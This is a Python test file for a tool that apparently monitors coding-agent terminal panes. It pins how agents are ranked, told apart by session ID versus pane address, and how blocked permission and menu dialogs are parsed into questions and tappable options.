def test_an_agent_in_an_unknown_workspace_still_renders(raw_snapshot: dict) -> None:
    # A workspace closed between the two halves of one snapshot: the join misses
    # and must degrade to a blank label, not raise.
    s = Snapshot.from_raw(dict(raw_snapshot, workspaces=[]))
    assert len(s.agents) == 6
    assert {a.workspace for a in s.agents} == {""}
    assert {a.workspace_number for a in s.agents} == {None}


# --- ranking: the full order, pinned end to end ----------------------------


def _synthetic(*statuses: str) -> Snapshot:
    """A snapshot with one agent per given status, in the order given."""
    return Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {
                    "pane_id": f"w{i}:p1",
                    "agent_status": status,
                    "agent_session": {"value": f"{i:08d}-0000-4000-8000-000000000000"},
                }
                for i, status in enumerate(statuses)
            ],
            "workspaces": [],
        }
    )


def test_the_feed_orders_all_five_states_at_once() -> None:
    """blocked < done < idle < working < unknown, proved on one snapshot.

    The fixture contains only idle and working, so every existing ordering test
    mutates one agent and checks it reached the top. That cannot catch a middle
    of the order that is wrong.
    """
    s = _synthetic("working", "unknown", "idle", "blocked", "done")
    assert [a.status for a in s.agents] == [
        AgentStatus.BLOCKED,
        AgentStatus.DONE,
        AgentStatus.WORKING,
        AgentStatus.IDLE,
        AgentStatus.UNKNOWN,
    ]
    assert [a.rank for a in s.agents] == [0, 1, 2, 3, 4]


def test_an_unrecognised_status_sorts_last_and_never_first() -> None:
    """A status invented upstream must degrade to the bottom of the feed.

    Sorting an unknown state *first* would be the worst failure mode: it would
    push the genuinely blocked agents off the top of a phone screen.
    """
    s = _synthetic("blocked", "teleporting", "done", "", "idle")
    assert [a.status for a in s.agents] == [
        AgentStatus.BLOCKED,
        AgentStatus.DONE,
        AgentStatus.IDLE,
        AgentStatus.UNKNOWN,
        AgentStatus.UNKNOWN,
    ]  # no working agent here; idle is the last of the known states
    assert s.agents[0].status is AgentStatus.BLOCKED
    assert rank("teleporting") == max(rank(s) for s in AgentStatus) == 4


def test_ties_break_on_workspace_then_pane_not_on_arrival_order() -> None:
    raw = {
        "protocol": EXPECTED_PROTOCOL,
        "agents": [
            {"pane_id": "w2:p9", "agent_status": "idle", "workspace_id": "w2"},
            {"pane_id": "w1:p2", "agent_status": "idle", "workspace_id": "w1"},
            {"pane_id": "w1:p1", "agent_status": "idle", "workspace_id": "w1"},
        ],
        "workspaces": [
            {"workspace_id": "w1", "label": "one", "number": 1},
            {"workspace_id": "w2", "label": "two", "number": 2},
        ],
    }
    assert [a.target for a in Snapshot.from_raw(raw).agents] == [
        "w1:p1",
        "w1:p2",
        "w2:p9",
    ]


# --- recency, within a rank only -------------------------------------------


def _by_seq(*agents: tuple[str, str, int]) -> Snapshot:
    """A snapshot of ``(pane, status, state_change_seq)`` agents, one workspace each."""
    return Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {
                    "pane_id": pane,
                    "agent_status": status,
                    "workspace_id": "w1",
                    "state_change_seq": seq,
                }
                for pane, status, seq in agents
            ],
            "workspaces": [{"workspace_id": "w1", "label": "one", "number": 1}],
        }
    )


def test_the_idle_agent_that_changed_most_recently_comes_first() -> None:
    """What the recency rule is for: two idle agents, the fresher one on top.

    ``stale`` sits in the lower pane, so under the old workspace-then-pane
    tiebreak it led. Only recency can put ``fresh`` first here.
    """
    s = _by_seq(("w1:p1", "idle", 4), ("w1:p9", "idle", 91))
    assert [a.target for a in s.agents] == ["w1:p9", "w1:p1"]


def test_a_stale_blocked_agent_still_outranks_a_fresh_idle_one() -> None:
    """Recency must never move an agent between ranks.

    Blocked means waiting on the user, and staleness makes that more urgent,
    not less -- so the oldest blocked agent in the herd stays above the idle
    one that changed a second ago.
    """
    s = _by_seq(("w1:p1", "blocked", 1), ("w1:p9", "idle", 900))
    assert [a.status for a in s.agents] == [AgentStatus.BLOCKED, AgentStatus.IDLE]
    assert s.agents[0].target == "w1:p1"


def test_recency_outranks_workspace_and_pane_but_only_within_a_rank() -> None:
    """The full order: rank first, then recency, and position only to break a tie."""
    s = _by_seq(
        ("w1:p1", "working", 99),
        ("w1:p2", "idle", 2),
        ("w1:p3", "idle", 50),
        ("w1:p4", "blocked", 1),
    )
    assert [a.target for a in s.agents] == ["w1:p4", "w1:p1", "w1:p3", "w1:p2"]


def test_agents_that_never_changed_tie_and_fall_back_to_position() -> None:
    """Seq 0 is "no reported change", not "changed at time zero" -- it sorts last."""
    s = _by_seq(("w1:p9", "idle", 0), ("w1:p2", "idle", 0), ("w1:p5", "idle", 3))
    assert [a.target for a in s.agents] == ["w1:p5", "w1:p2", "w1:p9"]


def test_a_poll_that_changes_nothing_leaves_the_key_untouched() -> None:
    """Stability under the feed's re-poll: ``revision`` moves every tick, and the
    order must not move with it. Only a real state change bumps
    ``state_change_seq``, which is why the key is built on that and not on
    ``revision``.
    """
    before = _by_seq(("w1:p1", "idle", 4), ("w1:p9", "idle", 91))
    keys = [a.sort_key for a in before.agents]
    busier = [a.model_copy(update={"revision": a.revision + 17}) for a in before.agents]
    assert [a.sort_key for a in busier] == keys


def test_the_urgency_is_the_only_term_a_caller_may_replace() -> None:
    """The feed re-sorts with the corrected rank on top, which is a
    rank this module cannot compute -- it depends on the seen ledger. So
    ``feed_key`` TAKES the rank, and ``sort_key`` is the call that passes none.
    That is what makes it one definition of the order rather than two: the
    render layer supplies a number, never a tuple, and a term added here reaches
    the feed by the only path there is.
    """
    one = _by_seq(("w1:p1", "done", 4)).agents[0]
    assert one.feed_key() == one.sort_key
    demoted = one.feed_key(rank(AgentStatus.IDLE))
    assert demoted[0] == rank(AgentStatus.IDLE) != one.sort_key[0]
    assert demoted[1:] == one.sort_key[1:]


def test_sort_is_stable_across_every_input_permutation(raw_snapshot: dict) -> None:
    """Determinism means one canonical order, not just "reversal is a no-op".

    The original determinism test compared two runs of the same code, so it
    could not distinguish a real ordering from any other stable one. Every
    permutation of the fixture must produce byte-identical output.
    """
    expected = [a.target for a in Snapshot.from_raw(raw_snapshot).agents]
    for permutation in itertools.permutations(raw_snapshot["agents"]):
        s = Snapshot.from_raw(dict(raw_snapshot, agents=list(permutation)))
        assert [a.target for a in s.agents] == expected
        assert [a.session for a in s.agents] == [
            a.session for a in Snapshot.from_raw(raw_snapshot).agents
        ]


# --- identity vs address, and reconciliation -------------------------------


SESSION_A = SessionId("11111111-1111-4111-8111-111111111111")
SESSION_B = SessionId("22222222-2222-4222-8222-222222222222")


def _two_agents(a_pane: str, b_pane: str) -> Snapshot:
    """Two known agents, each pinned to whichever pane is passed in."""
    return Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {
                    "pane_id": a_pane,
                    "agent_status": "idle",
                    "agent_session": {"value": SESSION_A, "agent": "claude"},
                    "terminal_title_stripped": "agent A",
                    "cwd": "/home/user/projects/alpha",
                },
                {
                    "pane_id": b_pane,
                    "agent_status": "idle",
                    "agent_session": {"value": SESSION_B, "agent": "claude"},
                    "terminal_title_stripped": "agent B",
                    "cwd": "/home/user/projects/beta",
                },
            ],
            "workspaces": [],
        }
    )


def test_agents_that_swap_panes_are_still_told_apart_by_session() -> None:
    """The whole point of the identity type, in one test.

    Pane ids are positional: close a pane, split a new one, and ``w1:p3`` comes
    back attached to somebody else. An address lookup follows the pane; an
    identity lookup follows the agent.
    """
    before = _two_agents("w1:p1", "w1:p3")
    after = _two_agents("w1:p3", "w1:p1")  # they traded addresses

    a_before, a_after = before.by_session(SESSION_A), after.by_session(SESSION_A)
    assert a_before is not None and a_after is not None
    assert a_before.title == a_after.title == "agent A"
    assert a_before.target != a_after.target  # ...at a new address

    # The same lookup by address quietly returns the *other* agent.
    stale = after.by_target(PaneId("w1:p1"))
    assert stale is not None
    assert stale.title == "agent B"


def test_a_sessionless_agent_never_answers_an_identity_lookup() -> None:
    s = Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {"pane_id": "w1:p1", "agent_status": "blocked"},
                {
                    "pane_id": "w1:p3",
                    "agent_status": "idle",
                    "agent_session": {"value": SESSION_A},
                },
            ],
            "workspaces": [],
        }
    )
    assert s.by_session(SessionId("")) is None
    assert s.by_session(SessionId("  ")) is None
    assert s.by_session(SESSION_B) is None  # a real UUID that is simply not here
    found = s.by_session(SESSION_A)
    assert found is not None and found.target == "w1:p3"
    # ...and the sessionless one is still addressable, because it still exists.
    assert s.by_target(PaneId("w1:p1")) is not None


def test_an_address_cannot_be_passed_where_an_identity_is_meant() -> None:
    """The mistake the identity type exists to stop, caught at runtime as well as by pyright.

    ``by_session(agent.target)`` is a type error (PaneId is not a SessionId), but
    the value that reaches a route handler is an untyped string from a URL or a
    notification payload, so the shape is checked too.
    """
    s = _two_agents("w1:p1", "w1:p3")
    with pytest.raises(ValueError, match="pane id"):
        s.by_session(SessionId("w1:p3"))
    with pytest.raises(ValueError, match="pane id"):
        as_session_id("w1:p3")
    # ...and the reverse: a remembered identity is not an address to drive.
    with pytest.raises(ValueError, match="session id"):
        s.by_target(PaneId(SESSION_A))
    with pytest.raises(ValueError, match="session id"):
        as_pane_id(SESSION_A)
    # The doors themselves accept the right kind and normalize whitespace.
    assert as_session_id(f"  {SESSION_A} ") == SESSION_A
    assert as_pane_id(" w1:p3 ") == "w1:p3"


def test_resolve_session_reports_an_agent_that_stayed_put() -> None:
    s = _two_agents("w1:p1", "w1:p3")
    r = s.resolve_session(SESSION_A, expected_target=PaneId("w1:p1"))
    assert r.presence is Presence.HERE
    assert r.ok is True
    assert r.target == "w1:p1"
    assert r.agent is not None and r.agent.title == "agent A"
    assert r.occupant is None  # the occupant *is* the agent; not worth reporting
    assert r.message == ""


def test_resolve_session_detects_the_pane_moving_underneath() -> None:
    """A drill-in opened on w1:p1 minutes ago must be told the agent moved."""
    s = _two_agents("w2:p7", "w1:p3")
    r = s.resolve_session(SESSION_A, expected_target=PaneId("w1:p1"))
    assert r.presence is Presence.MOVED
    assert r.ok is False
    assert r.agent is not None and r.agent.title == "agent A"
    assert r.target == "w2:p7"  # drive the new address, never the remembered one
    assert r.expected_target == "w1:p1"
    assert r.occupant is None  # nobody took the old pane
    assert "moved" in r.message and "w2:p7" in r.message


def test_resolve_session_names_the_stranger_now_holding_the_pane() -> None:
    """The notification case: tapped ten minutes late, the pane is recycled.

    Without this the tap would drive whatever now sits at the remembered
    address — a different agent, in a different repo.
    """
    s = _two_agents("w2:p7", "w1:p1")  # agent B moved into A's old pane
    r = s.resolve_session(SESSION_A, expected_target=PaneId("w1:p1"))
    assert r.presence is Presence.MOVED
    assert r.occupant is not None and r.occupant.title == "agent B"
    assert r.occupant.session == SESSION_B
    assert r.target == "w2:p7"


def test_resolve_session_reports_a_gone_agent_instead_of_driving_the_pane() -> None:
    s = _two_agents("w1:p1", "w1:p3")
    r = s.resolve_session(SESSION_B, expected_target=PaneId("w1:p3"))
    assert r.presence is Presence.HERE  # sanity: B is alive at w1:p3

    closed = Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {
                    "pane_id": "w1:p3",  # same pane, brand new agent
                    "agent_status": "working",
                    "agent_session": {"value": SESSION_A},
                    "terminal_title_stripped": "agent A",
                }
            ],
            "workspaces": [],
        }
    )
    gone = closed.resolve_session(SESSION_B, expected_target=PaneId("w1:p3"))
    assert gone.presence is Presence.GONE
    assert gone.ok is False
    assert gone.agent is None
    assert gone.target is None, "nothing to drive — the identity is not here"
    assert gone.occupant is not None and gone.occupant.session == SESSION_A
    assert "gone" in gone.message.lower()
    assert "different agent" in gone.message


def test_resolve_session_without_a_remembered_address() -> None:
    # A card key carries only the identity: alive is all there is to check.
    s = _two_agents("w1:p1", "w1:p3")
    assert s.resolve_session(SESSION_A).presence is Presence.HERE
    missing = s.resolve_session(SessionId("33333333-3333-4333-8333-333333333333"))
    assert missing.presence is Presence.GONE
    assert missing.occupant is None
    assert missing.message == "This agent is gone."


def test_resolve_session_on_a_sessionless_lookup_is_gone_not_a_match() -> None:
    s = _two_agents("w1:p1", "w1:p3")
    assert s.resolve_session(SessionId("")).presence is Presence.GONE


def test_a_resolution_is_frozen() -> None:
    r = _two_agents("w1:p1", "w1:p3").resolve_session(SESSION_A)
    with pytest.raises(ValidationError):
        r.presence = Presence.GONE  # type: ignore


def test_the_session_is_usable_as_a_transcript_filename(snap: Snapshot) -> None:
    """The transcript reader opens ~/.claude/projects/*/<session>.jsonl; keep that possible.

    Nothing here reads a transcript; this only pins that the identity survives
    normalization as a bare UUID, with no prefix, casing change or pane id mixed
    in, so it can be used as a filename verbatim.
    """
    for a in snap.agents:
        assert re.fullmatch(r"[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}", a.session)
        assert f"{a.session}.jsonl".count("/") == 0


def test_an_agent_with_no_pane_id_is_not_reachable_by_the_empty_address() -> None:
    """The address twin of the sessionless bug: "" must never match anybody.

    A pane whose id the runner omitted normalizes to ``target=""``. A linear
    first-match on an empty address would hand back that agent to any caller
    that lost its target — and unlike a bad lookup, this one gets *driven*.
    """
    s = Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {"agent_status": "idle", "agent_session": {"value": SESSION_A}},
                {"pane_id": "w1:p3", "agent_status": "idle"},
            ],
            "workspaces": [],
        }
    )
    assert [a.target for a in s.agents] == ["", "w1:p3"]
    assert s.by_target(PaneId("")) is None
    assert s.by_target(PaneId("   ")) is None
    # The sessionless one is still resolvable by identity, which is the point.
    found = s.by_session(SESSION_A)
    assert found is not None and found.target == ""


# --- BlockedPrompt: chrome under the question ------------------------------

# A real dialog does not always end on its question. Claude Code's trust prompt
# prints a capability hint and a bare hyperlink label *under* "Quick safety
# check: … or one you trust?", and taking the adjacent paragraph put that link
# label ("Security guide") above two live tap targets. The rule that fixes it
# may only ever step over a paragraph to reach an EARLIER one that asks a
# question, never inside the same paragraph, never past the dialog's own rule,
# and never more than a few paragraphs back. The tests below pin all four
# limits, because an over-eager version of this rule would drop real question
# text — a worse failure than the one it fixes.

TRUST_DIALOG = (
    "──────────────────────────────────────────\n"
    " Accessing workspace:\n"
    "\n"
    " /home/owner/probe\n"
    "\n"
    " Quick safety check: Is this a project you created or one you trust?\n"
    "\n"
    " Claude Code'll be able to read, edit, and execute files here.\n"
    "\n"
    " Security guide\n"
    "\n"
    "❯ 1. Yes, I trust this folder\n"
    "  2. No, exit\n"
    "\n"
    "Enter to confirm · Esc to cancel\n"
)


def test_chrome_under_the_question_is_stepped_over() -> None:
    p = BlockedPrompt.parse(TRUST_DIALOG)
    assert p.is_choice is True
    assert p.question == (
        "Quick safety check: Is this a project you created or one you trust?"
    )


def test_stepping_over_chrome_never_merges_it_into_the_question() -> None:
    # The result is exactly one paragraph. The skipped chrome is dropped from
    # the question, not glued to it — it stays recoverable in `raw`.
    p = BlockedPrompt.parse(TRUST_DIALOG)
    assert "Security guide" not in p.question
    assert "execute files here" not in p.question
    assert "Security guide" in p.raw


def test_a_question_without_a_question_mark_keeps_the_adjacent_paragraph() -> None:
    # Nothing in reach asks anything, so the conservative answer stands: the
    # paragraph nearest the buttons, exactly as before the chrome fix.
    text = "Choose how to proceed\n\nPick carefully.\n\n1. Merge\n2. Rebase\n"
    p = BlockedPrompt.parse(text)
    assert p.question == "Pick carefully."


def test_the_question_search_never_leaves_the_current_dialog_box() -> None:
    # A question mark up in finished transcript must never be promoted over the
    # dialog's own text: the rule at the top of the box is a hard boundary.
    text = (
        "❯ Should I force-push to main?\n"
        "\n"
        "──────────────────────────────\n"
        " Bash command\n"
        "\n"
        " This command requires approval\n"
        "\n"
        "1. Yes\n"
        "2. No\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.question == "This command requires approval"


def test_the_question_search_gives_up_after_a_few_paragraphs() -> None:
    # Bounded lookback: a stray "?" buried under a stack of chrome is not
    # evidence, so the adjacent paragraph wins.
    text = "Did the deploy finish?\n\none\n\ntwo\n\nthree\n\nfour\n\n1. Yes\n2. No\n"
    p = BlockedPrompt.parse(text)
    assert p.question == "four"


def test_a_dashed_diff_rule_is_a_divider_not_prose() -> None:
    # The first chrome defect, in miniature: the U+254C rules Claude Code draws around a
    # file-diff body are chrome, so neither they nor the diff between them can
    # become the question shown above the buttons.
    text = (
        " Create file\n"
        " notes.txt\n"
        "╌" * 40 + "\n"
        "  1 hello\n" + "╌" * 40 + "\n"
        " Do you want to create notes.txt?\n"
        "\n"
        "❯ 1. Yes\n"
        "  2. No\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.question == "Do you want to create notes.txt?"
    assert [(o.number, o.label) for o in p.options] == [(1, "Yes"), (2, "No")]


def test_the_option_marker_class_still_refuses_the_response_bullet() -> None:
    # A corpus protection, re-pinned after the chrome fix touched this area: Claude Code
    # prefixes the first line of a response with ● (U+25CF), which _OPTION_RE's
    # marker class does not accept, so a finished numbered recap cannot build a
    # 1..n run even when it ends the viewport. Adding ● to that class would look
    # like a tidy-up and would silently remove a real protection.
    recap = "● 1. README.md\n  2. pyproject.toml\n  3. src/pkg/__init__.py\n"
    p = BlockedPrompt.parse(recap)
    assert p.is_choice is False
    assert p.options == ()


# --- An answer is never promoted into the question -------------------------

#: The last THREE lines of the same capture `test_answer.FOOTER_ONLY` reads its
#: last two from. Nothing here is hand-shaped: a pane read one line earlier than
#: that one -- a mid-render, or a scrolled view -- shows the tail of a live menu
#: with no `1.` above it, so `_trailing_menu` finds no run and refuses to call it
#: a menu. What is left on screen is a single option row.
OPTION_TAIL = (
    "\n".join(
        (
            Path(__file__).parent
            / "fixtures"
            / "capture-blocked-permission-prompt"
            / "detection.txt"
        )
        .read_text(encoding="utf-8")
        .splitlines()[-3:]
    )
    + "\n"
)


def test_a_lone_option_row_from_a_real_capture_is_not_the_question() -> None:
    """The defect, measured on the bytes it was found in.

    This parsed to ``question == "3. No"`` -- one of the ANSWERS, printed on the
    phone as the thing being asked, with pressable keys under it. Wrong beats
    blank for harm here: the reader is told something false about what their
    agent wants, and the honest state cannot catch it, because a question
    counts as having read something. So the promotion has to stop at the parser.
    """
    p = BlockedPrompt.parse(OPTION_TAIL)

    assert "3. No" in p.raw, "the capture must still end on an option row"
    assert p.options == (), "no 1..n run: this is a menu's tail, not a menu"
    assert p.question == "", "an option row is an answer; it is never the question"


def test_a_truncated_menu_says_nothing_rather_than_the_wrong_thing() -> None:
    """The end state this trades into, stated plainly: it is not a regression.

    Reading one line earlier again puts TWO option rows on screen and still no
    ``1.``. The old fallback glued both into one paragraph and showed it as the
    question. There is no third outcome available on this screen -- the question
    is not on it -- so the honest empty is the correct one (the honest state gives it a
    sentence and a door to the pane).
    """
    lines = OPTION_TAIL.splitlines()
    two_rows = BlockedPrompt.parse(
        "\n".join(
            (
                Path(__file__).parent
                / "fixtures"
                / "capture-blocked-permission-prompt"
                / "detection.txt"
            )
            .read_text(encoding="utf-8")
            .splitlines()[-4:]
        )
        + "\n"
    )

    assert len(lines) == 3
    assert two_rows.question == ""
    assert two_rows.options == ()


def test_the_whole_capture_still_reads_its_real_question() -> None:
    """The direction that would do damage if this fix went one character wider.

    Unshifted, the same capture is a live 1..n menu whose question is above it.
    A rule that dropped option rows out of the question must not touch a screen
    the parser can read properly.
    """
    text = (
        Path(__file__).parent
        / "fixtures"
        / "capture-blocked-permission-prompt"
        / "detection.txt"
    ).read_text(encoding="utf-8")
    p = BlockedPrompt.parse(text)

    assert p.question == "Do you want to proceed?"
    assert [o.number for o in p.options] == [1, 2, 3]


def test_a_question_that_merely_sits_next_to_option_rows_survives() -> None:
    """The narrowness of the rule, pinned.

    Only a paragraph that is NOTHING BUT numbered rows is refused. A paragraph
    whose own text happens to run into a row -- a plan, a recap, a "Next up:" --
    is still the nearest thing to the buttons and is still returned, exactly as
    it was before.
    """
    assert BlockedPrompt.parse("Next up:\n1. rerun the failing test\n").question == (
        "Next up:\n1. rerun the failing test"
    )
    recap = "● 1. README.md\n  2. pyproject.toml\n  3. src/pkg/__init__.py\n"
    assert BlockedPrompt.parse(recap).question.startswith("● 1. README.md")


def test_the_fallback_still_rescues_the_screens_it_was_written_for() -> None:
    """Why the fallback is narrowed and not deleted, in the two shapes that need it.

    Both of these are real blocked screens whose question does not end in ``?``
    inside its own box, so the ``?`` search finds nothing and the last paragraph
    is all there is. Deleting the fallback would trade one wrong question for no
    question on screens that work today.
    """
    approval = (
        "❯ Should I force-push to main?\n"
        "\n"
        "──────────────────────────────\n"
        " Bash command\n"
        "\n"
        " This command requires approval\n"
        "\n"
        "1. Yes\n"
        "2. No\n"
    )
    statement = "Choose how to proceed\n\nPick carefully.\n\n1. Merge\n2. Rebase\n"

    assert BlockedPrompt.parse(approval).question == "This command requires approval"
    assert BlockedPrompt.parse(statement).question == "Pick carefully."


# --- one expected protocol per view, not one per module --------------------


def test_a_snapshot_judges_itself_against_the_protocol_it_was_handed() -> None:
    """``protocol_ok`` used to compare against the module constant, always.

    A client configured for a different protocol guarded its writes against
    ``settings.expected_protocol`` while the header it rendered compared against
    the build-time ``EXPECTED_PROTOCOL`` -- two numbers, one runner, and a banner
    that contradicted the behaviour underneath it.
    """
    handed = EXPECTED_PROTOCOL + 1
    raw = {"protocol": handed, "agents": [], "workspaces": []}
    assert Snapshot.from_raw(raw).protocol_ok is False  # the build's number
    assert Snapshot.from_raw(raw, expected_protocol=handed).protocol_ok is True
    assert Snapshot.from_raw(raw, expected_protocol=handed).expected_protocol == handed


def test_an_omitted_expectation_still_means_the_build_it_was_compiled_for() -> None:
    raw = {"protocol": EXPECTED_PROTOCOL, "agents": [], "workspaces": []}
    assert Snapshot.from_raw(raw).expected_protocol == EXPECTED_PROTOCOL
    assert Snapshot.from_raw(raw).protocol_ok is True


def test_a_blocked_prompt_refuses_a_mixed_up_address_and_identity() -> None:
    """The tap-to-answer surface: a keystroke is one step from these two fields."""
    with pytest.raises(ValueError, match="session id"):
        BlockedPrompt.parse("q?", target=SESSION_A)  # type: ignore
    with pytest.raises(ValueError, match="pane id"):
        BlockedPrompt.parse("q?", session="w1:p1")  # type: ignore
    p = BlockedPrompt.parse("q?", target=as_pane_id(" w1:p1 "), session=SESSION_A)
    assert (p.target, p.session) == ("w1:p1", SESSION_A)


# --- A shape is EARNED, not defaulted to -----------------------------------

# A settings picker, shaped the way the real ones are: a title, a sentence of
# description, a numbered run ENDING the viewport (so the trailing anchor is no
# help here — that is the point), a marker on the row it would act on, and a
# footer naming what Enter does. This is the class of screen a neighbouring
# project live-probed: a digit set the model AND saved it as the default for
# every new session, announced nowhere. See docs/modules/engine/model/_earned.md.
PICKER = (
    "Select model\n"
    "Switch between models. Your pick becomes the default for new sessions.\n"
    "\n"
    "❯ 1. Default (recommended)\n"
    "  2. Opus\n"
    "  3. Sonnet\n"
    "  4. Haiku\n"
    "\n"
    "Enter to set as default · Esc to cancel\n"
)


def test_a_picker_that_asks_nothing_is_refused_however_tidy_its_rows() -> None:
    """The run is trailing, corroborated, marked -- and still not a menu.

    Every clause of the OLD precondition is satisfied here: a trailing ``1..n``
    run, a footer hint, a ``❯`` on a row, no checkbox glyph. Before this ticket
    that combination WAS the definition of single-choice, so this screen would
    have been handed four tappable digits on the strength of nothing having
    positively identified it.

    Two things now have to be true and neither is. It asks no question, and the
    verb it prints for Enter is ``set as default`` -- which is not selection,
    it is the off-machine side effect, printed in the footer in words.
    """
    p = BlockedPrompt.parse(PICKER)
    assert p.shape is MenuShape.UNKNOWN, "live, and not a menu we can drive"
    assert p.options == ()
    assert p.corroborated is True, "it IS live; that was never the question"
    assert [(h.key, h.verb) for h in p.hints] == [
        ("enter", "set as default"),
        ("esc", "cancel"),
    ], "and the keys it printed are still offered, verbs and all"


def test_the_same_picker_earns_its_rows_once_it_asks_something() -> None:
    """The control: one clause changes and the refusal lifts.

    Pinned so the rule above cannot be read as "pickers are refused" -- there is
    no picker detector here and there must not be one. What is tested is whether
    the SCREEN said its rows are the answer.
    """
    p = BlockedPrompt.parse(PICKER.replace("Select model\n", "Which model?\n"))
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2, 3, 4]


def test_naming_enter_as_select_earns_the_rows_with_no_question_mark() -> None:
    """The other branch, which a real capture depends on.

    ``tests/test_model.LIVE_BLOCKED`` is trimmed from a real blocked agent and
    its dialog leads with a STATEMENT, not a question -- so the question-mark
    branch alone would have cost us a screen we answer today. What that screen
    does print is ``Enter to select``, which is the terminal saying that taking
    the focused row is all Enter does.
    """
    p = BlockedPrompt.parse(PICKER.replace("set as default", "select"))
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2, 3, 4]


def test_the_marker_is_required_on_every_shape_not_just_single_choice() -> None:
    """No cursor, no menu is applied in ``parse``, before any shape is judged."""
    boxes = "1. [ ] alpha\n2. [x] beta\n\nSpace to toggle · Enter to confirm\n"
    assert BlockedPrompt.parse(boxes).options == ()
    marked = BlockedPrompt.parse("❯ " + boxes)
    assert marked.shape is MenuShape.MULTI_SELECT
    assert [o.number for o in marked.options] == [1, 2]


# --- A wizard step is not an answered question -----------------------------

# The strip is what Claude draws above a question that is one of several, and
# the ARROWS are the detection: a single AskUserQuestion draws the same tokens
# without them. See docs/modules/engine/model/_stepper.md.
WIZARD_STEP = (
    "←  ☒ Focus area  ☐ Scope  ☐ Workflow  ✔ Submit  →\n"
    "\n"
    "How should I approach the work?\n"
    "\n"
    "❯ 1. Plan first\n"
    "     I draft a plan and get your approval first.\n"
    "  2. Just build it\n"
    "     I go straight to implementation.\n"
    "  3. Type something.\n"
    "\n"
    "Enter to select · Tab/Arrow keys to navigate · Esc to cancel\n"
)


def test_a_wizard_step_is_read_as_one_step_of_several() -> None:
    """The rows are still single-choice; the QUESTION is not over."""
    p = BlockedPrompt.parse(WIZARD_STEP)
    assert p.shape is MenuShape.SINGLE_CHOICE, "the step itself chooses one row"
    assert [o.number for o in p.options] == [1, 2, 3]
    assert p.stepper is not None
    assert p.stepper.steps == ("Focus area", "Scope", "Workflow")
    assert p.stepper.total == 3, "Submit is the strip's own step, not a question"
    assert p.stepper.answered == 1
    assert p.stepper.remaining == 2


def test_a_single_question_strip_is_not_a_stepper() -> None:
    """The control, and the reason the arrows are load-bearing.

    One AskUserQuestion draws the same box glyph with NO arrows around it, and
    on that screen a tap really does end the question. Reading this as a stepper
    would take a true claim off a screen that had earned it.
    """
    single = WIZARD_STEP.replace(
        "←  ☒ Focus area  ☐ Scope  ☐ Workflow  ✔ Submit  →",
        " ☐ Approach ",
    )
    p = BlockedPrompt.parse(single)
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert p.stepper is None


def test_the_step_this_is_is_never_claimed() -> None:
    """A revisited step ticks EXACTLY like the one after it -- so no index.

    The strip marks the current tab by inverting its background, which the
    answer path does not read. The count of ticks cannot stand in for it: these
    two screens are a different step of the same wizard and their strips are
    byte-identical.
    """
    on_step_two = BlockedPrompt.parse(WIZARD_STEP)
    revisiting_step_one = BlockedPrompt.parse(
        WIZARD_STEP.replace(
            "How should I approach the work?", "Which focus area should we work on?"
        )
    )
    assert on_step_two.stepper == revisiting_step_one.stepper
    assert not hasattr(on_step_two.stepper, "index")


def test_a_question_mark_in_the_transcript_is_not_the_dialog_asking() -> None:
    """The leak a LIVE probe found, and the reason the box has to be a box.

    Provoked on the isolated session on 2026-08-23: open ``/model`` in a pane
    whose transcript already holds a question, and the screen draws no rule this
    parser recognises -- its separator is a row of U+2594. So the "dialog box"
    fell back to the whole viewport, a question mark three paragraphs back in
    the transcript satisfied the gate, and the picker earned five digits again.

    With no rule above it there is no box, and only the paragraph the run sits
    DIRECTLY under can be what it is asking.
    """
    transcript = "How should I approach the work?\n\n● I will use the parser.\n\n"
    assert BlockedPrompt.parse(transcript + PICKER).options == ()
    # ...and the control: the same run one paragraph under the same question.
    assert BlockedPrompt.parse("How should I?\n\n❯ 1. Yes\n  2. No\n").options


PLAN_APPROVAL = (
    "  ────────────\n"
    "   Claude has written up a plan and is ready to execute. "
    "Would you like to proceed?\n"
    "\n"
    "   ❯ 1. Yes, auto-accept edits\n"
    "     2. Yes, manually approve edits\n"
    "     3. Tell Claude what to change\n"
    "        shift+tab to approve with this feedback\n"
    "\n"
    "   ctrl+g to edit in Vim · ~/.claude/plans/some-plan.md\n"
)
"""ExitPlanMode as Claude Code 2.1.251 draws it, transcribed from a real capture.

The bytes themselves live in ``tests/fixtures/capture-blocked-plan-approval``,
which is what pins the screen; this copy exists so the two lines below can be
deleted one at a time, which a fixture cannot do.
"""

SUB_LINE = "        shift+tab to approve with this feedback\n"
EDITOR_FOOTER = "   ctrl+g to edit in Vim · ~/.claude/plans/some-plan.md\n"


def test_the_plan_approval_screen_is_read_with_both_of_its_hint_lines() -> None:
    """The whole screen used to come back as ``shape=none``.

    Not "we read it badly": we did not believe a question was there at all, on
    the most common blocked screen in plan mode. On a phone that is the honest state's
    failure -- an agent waiting, and a screen saying nothing is happening.
    """
    p = BlockedPrompt.parse(PLAN_APPROVAL)
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2, 3]
    assert p.question.endswith("Would you like to proceed?")
    # The footer is read as the hint it is, and `shift+tab` is NOT: a key we
    # have no `send_keys` spelling for must never reach a button.
    assert [(h.key, h.verb) for h in p.hints] == [("ctrl-g", "edit in vim")]


@pytest.mark.parametrize("line", [SUB_LINE, EDITOR_FOOTER])
def test_either_hint_line_alone_used_to_be_fatal_and_no_longer_is(line: str) -> None:
    """Isolated by deletion, which is how the ticket was written and confirmed.

    Removing BOTH of these made the screen parse before the fix; removing either
    one alone did not. So this is parametrized rather than asserted once: a fix
    that tolerated only the footer, or only the sub-line, would leave the screen
    exactly as unreadable as it was, and would pass a single-case test.
    """
